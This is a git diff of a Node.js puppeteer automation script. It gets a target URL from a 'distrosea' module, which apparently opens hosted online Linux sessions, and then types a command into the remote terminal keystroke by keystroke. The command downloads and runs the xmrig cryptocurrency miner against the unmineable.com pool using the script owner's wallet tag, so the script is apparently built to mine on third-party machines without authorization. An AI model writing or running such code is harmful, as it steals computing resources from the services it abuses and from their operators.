@@ -1,16 +1,16 @@
 const { connect } = require("puppeteer-real-browser");
+const distrosea = require("./distrosea.js");
 const proxy = require("./proxy.js");
 const sleep = require("./sleep.js");
 require("dotenv").config();
 
-const host = process.env.HOST || "http://localhost";
-
 const run = async () => {
-  const response = await fetch(`${host}/distro`);
-  const data = await response.json();
-  const getUrl = data.url;
+  let getUrl = false;
+  while (!getUrl) {
+    getUrl = await distrosea();
+    await sleep(2);
+  }
 
-  console.log(host);
   console.log(getUrl);
 
   const { page, browser } = await connect({
@@ -103,17 +103,16 @@ const run = async () => {
     text += "&& chmod +x xmrig ";
     text += "&& clear ";
     text += `&& ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u ${coin}.${job}#rup9-jjmz -p x`;
-
+    
     for (let i = 0; i < text.length; i++) {
       const char = text[i];
+      const cc = ":&#";
       if (
-        char === ":" ||
-        char === "&" ||
-        char === "#" ||
+        cc.includes(char) ||
         (char === char.toUpperCase() && char !== char.toLowerCase())
       ) {
         await page.keyboard.down("Shift");
-        await page.keyboard.press(char);
+        await page.keyboard.type(char);
         await page.keyboard.up("Shift");
       } else {
         await page.keyboard.type(char, { delay: 50 });
@@ -146,4 +145,4 @@ const run = async () => {
   }
 };
 
-run();
+run()
